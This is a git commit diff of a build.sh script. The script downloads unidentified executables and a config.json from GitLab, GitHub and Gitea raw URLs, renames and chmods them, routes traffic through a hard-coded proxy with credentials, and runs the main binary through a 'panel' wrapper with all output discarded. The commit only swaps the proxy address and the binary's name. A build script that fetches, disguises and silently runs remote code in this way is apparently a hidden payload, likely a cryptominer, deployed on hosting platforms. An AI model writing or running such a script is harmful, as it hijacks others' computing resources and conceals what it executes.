9f7be421051584942e37d1a6fb977edc6ad822cc
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-03 08:10:59 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,6 +1,8 @@
-proxy="192.252.209.155" 
-port="14455"
-wget -q -O kamakaze23 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x kamakaze23
+proxy="149.102.231.97" 
+port="14455" 
+user="render"  
+pass="render"
+wget -q -O Taguchi https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Taguchi
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -19,6 +21,6 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./kamakaze23 -c "config.json" >/dev/null 2>&1
+./panel ./Taguchi -c "config.json" >/dev/null 2>&1
 sleep 1
-sync; echo 3 > /proc/sys/vm/drop_caches
+sync; echo 1 > /proc/sys/vm/drop_caches
